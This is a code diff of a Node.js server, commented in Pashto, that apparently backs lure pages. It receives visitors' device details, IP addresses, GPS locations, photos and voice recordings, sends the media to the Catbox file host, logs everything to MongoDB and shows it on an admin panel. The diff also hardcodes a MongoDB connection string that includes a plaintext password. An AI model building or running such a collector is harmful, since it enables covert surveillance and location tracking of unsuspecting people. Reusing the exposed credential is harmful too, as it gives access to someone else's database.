@@ -8,35 +8,20 @@ const FormData = require('form-data');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// دلته خپل د MongoDB Connection String ولیکئ (پاسورډ یې خپل کړئ)
-const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://kingofface20_db_user:ستاسو_پاسورډ@cluster0.xxxxx.mongodb.net/?retryWrites=true&w=majority";
+// دلته خپل د MongoDB Connection String ولیکئ
+const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://kingofface20_db_user:7vALcITSPX1k04S3@cluster0.9xmnxrs.mongodb.net/?retryWrites=true&w=majority";
 
-// د وارننګونو د مخنیوي لپاره دلته اضافي اختیارونه لیرې شول
 mongoose.connect(MONGO_URI)
 .then(() => console.log('✅ Connected to MongoDB Atlas'))
 .catch(err => console.error('❌ MongoDB Connection Error:', err));
 
-// د ډیټابیس سکیمې (Schemas) ترڅو ډیټا هېڅکله ډلیټ نشي
-const deviceInfoSchema = new mongoose.Schema({
-    time: String,
-    ip: String,
-    info: String
-});
+const deviceInfoSchema = new mongoose.Schema({ time: String, ip: String, info: String });
 const DeviceInfo = mongoose.model('DeviceInfo', deviceInfoSchema);
 
-const locationSchema = new mongoose.Schema({
-    time: String,
-    ip: String,
-    latitude: Number,
-    longitude: Number
-});
+const locationSchema = new mongoose.Schema({ time: String, ip: String, latitude: Number, longitude: Number });
 const LocationData = mongoose.model('LocationData', locationSchema);
 
-const linkSchema = new mongoose.Schema({
-    type: String, // 'photo' یا 'voice'
-    url: String,
-    time: String
-});
+const linkSchema = new mongoose.Schema({ type: String, url: String, time: String });
 const LinkData = mongoose.model('LinkData', linkSchema);
 
 app.set('trust proxy', true);
@@ -45,8 +30,13 @@ const upload = multer({ storage: multer.memoryStorage() });
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// د پاڼو مسیرونه (Routes)
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.get('/page1', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index2.html'));
 });
 
 // Catbox ته د فایل د اپلوډ کولو فنکشن
@@ -67,6 +57,7 @@ async function uploadToCatbox(buffer, filename) {
     }
 }
 
+// د ډېټا د راټولولو او پوسټ کولو برخه (د ټولو پاڼو لپاره یو شان کار کوي)
 app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
     let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'نامعلوم';
     if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
@@ -74,18 +65,16 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req,
 
     const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
 
-    // ۱. د موبایل معلومات په MongoDB کې ساتل
     if (req.body.device_info) {
         try {
             const info = JSON.parse(req.body.device_info);
-            const entryText = `📅 نېټه: ${time}\n🌐 آی‌پي: ${clientIp}\n📱 برانډ: ${info.deviceType}\n🔢 انډرایډ: ${info.androidVer}\n📐 سکرین: ${info.screenSize}\n🔋 بیټرۍ: ${info.batteryLevel}\n🌐 ژبه: ${info.language}\n-----------------------------------`;
+            const entryText = `📅 نېټه: ${time}\n🌐 آی‌پي: ${clientIp}\n📱 برانډ: ${info.deviceType}\n🔢 انډرایډ/اوس: ${info.androidVer}\n📐 سکرین: ${info.screenSize}\n🔋 بیټرۍ: ${info.batteryLevel}\n🌐 ژبه: ${info.language}\n-----------------------------------`;
             
             await DeviceInfo.create({ time, ip: clientIp, info: entryText });
             return res.send("Device Info Saved");
         } catch (e) {}
     }
 
-    // ۲. لوکیشن په MongoDB کې ساتل
     if (req.body.latitude && req.body.longitude) {
         const lat = parseFloat(req.body.latitude);
         const lng = parseFloat(req.body.longitude);
@@ -95,33 +84,28 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req,
         }
     }
 
-    // ۳. عکس Catbox ته او لینک یې په MongoDB کې ساتل
     if (req.files && req.files.photo) {
         const file = req.files.photo[0];
         const onlineUrl = await uploadToCatbox(file.buffer, `photo_${Date.now()}.jpg`);
         if (onlineUrl) {
             await LinkData.create({ type: 'photo', url: onlineUrl, time });
             return res.send("Photo Saved");
-        } else {
-            return res.status(500).send("Photo Upload Failed");
         }
     }
 
-    // ۴. غږ Catbox ته او لینک یې په MongoDB کې ساتل
     if (req.files && req.files.voice) {
         const file = req.files.voice[0];
         const onlineUrl = await uploadToCatbox(file.buffer, `voice_${Date.now()}.ogg`);
         if (onlineUrl) {
             await LinkData.create({ type: 'voice', url: onlineUrl, time });
             return res.send("Voice Saved");
-        } else {
-            return res.status(500).send("Voice Upload Failed");
         }
     }
 
     res.status(400).send("Bad Request");
 });
 
+// د اډمین پاڼه
 app.get('/admin', async (req, res) => {
     const showWelcome = !req.headers.cookie?.includes('welcome=true') && req.query.action !== 'enter';
 
@@ -130,7 +114,6 @@ app.get('/admin', async (req, res) => {
         return res.redirect('/admin');
     }
 
-    // د ډیټا د پاکولو برخه
     if (req.query.delete) {
         const target = req.query.delete;
         if (target === 'locations') await LocationData.deleteMany({});
@@ -140,7 +123,6 @@ app.get('/admin', async (req, res) => {
         return res.redirect('/admin');
     }
 
-    // د ډیټابیس څخه د معلوماتو راکاږل
     const devices = await DeviceInfo.find().sort({ _id: -1 });
     const locations = await LocationData.find().sort({ _id: -1 });
     const photos = await LinkData.find({ type: 'photo' }).sort({ _id: -1 });
